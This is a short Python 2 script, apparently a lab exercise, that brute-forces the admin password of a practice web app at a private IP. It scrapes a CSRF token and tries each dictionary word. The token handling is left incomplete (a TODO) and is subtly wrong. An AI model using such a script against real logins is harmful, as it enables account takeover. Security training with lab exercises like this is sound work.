#!/usr/bin/env python2
from bs4 import BeautifulSoup
import requests

url = "http://192.168.56.102/login.php"
dictionary = "sample_dictionary.txt"
session = requests.session()
r = session.get(url)

# Assuming that there is only one word per line in your dictionary
word_list = open("sample_dictionary.txt", 'r').read().split('\n')

try:
    """ 
    Use BeautifulSoup to parse the webpage:
    Documentation: https://www.crummy.com/software/BeautifulSoup/bs4/doc/
    Inspect the page source to know why user_token is very important?
    """
    soup = BeautifulSoup(r.content, "html5lib")
    # TODO supply arguments to soup.find to get `user_token`
    user_token = soup.find('input', {'name': 'user_token'})
except:
    pass

for word in word_list:
    print("Testing word:", word)
    values = {'username':'admin',
            'password':word,
            'Login':"Login",
            'user_token':user_token}

    r = session.post(url, data=values, verify=False)

    # Check login sucess of fail
    if "Login failed" in r.content:
        print("Login failed")
    else:
        print("Login Success")
        print('admin', word)
        break
